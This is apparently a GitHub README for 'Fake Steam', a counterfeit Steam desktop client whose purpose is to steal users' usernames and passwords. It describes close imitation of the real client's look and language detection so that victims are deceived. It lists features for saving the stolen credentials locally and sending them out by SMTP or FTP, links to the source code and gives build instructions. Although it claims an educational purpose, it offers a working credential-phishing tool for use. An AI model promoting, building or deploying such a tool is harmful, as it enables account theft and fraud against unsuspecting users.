# Fake Steam

### A fake Steam desktop client that acts as a username/password logger.

------------------

## üëã Introduction

This program is a simple fake of the Steam desktop client corresponding to version 2.70.82.9. The development of this application has been for educational purposes, with the aim of demonstrating how a deception of this type can be made to simulate the execution of a legitimate application and thus obtain personal data (the username and password of Steam).

On the outside, the user will only see an application that consists of 3 forms with a couple of buttons and a little more, but the truth is that I have invested enough effort to get a good "mimic" (or at least I think it is good). There is a big job behind in the source code, and with a lot of re-usable code that can be useful to develop  related projects.

## üëå Features

 - Multi language support, supporting a total of 22 of the 26 languages of the original Steam client. 
 - The unsupported languages are Korean, Japanese, Traditional Chinese and Simplified Chinese.
 - Self-detection of language. By default, the language of the steam client installed on the PC will be detected, if the client is not installed, it will try to use the language of the OS, if this also fails, English language will be used by default.
 - Elaborated simulation of several features of the original Steam client, as well as the lighting effects of the original user-interface controls.
 - Username/password storage in local file.
 - Username/password submission by SMTP.
 - Username/password submission by FTP.

In summary, I have tried to take care of all the possible details, although It is not perfect, of course.

## üìù Requirements

- Microsoft Windows OS.

## ü§ñ Getting Started

Download the latest source-code by clicking [here](https://github.com/ElektroStudios/Fake-Steam-desktop-client-password-logger/tree/master/Solution), and open it with Visual Studio.

### Settings

To configure the program you must compile the source code. Within the source code you will find a folder with name "Config" that contains all the configurable values of the program.

#### Language settings:

    #Region " Steam Interface Configuration "

IMPORTANT: You must compile the solution in **Release** mode, because in **Release** mode I suppress the  exceptions handled, and apart, the **Debug** mode has a different behavior and additional controls are shown to test the illumination of the buttons:

That's all. Enjoy it.
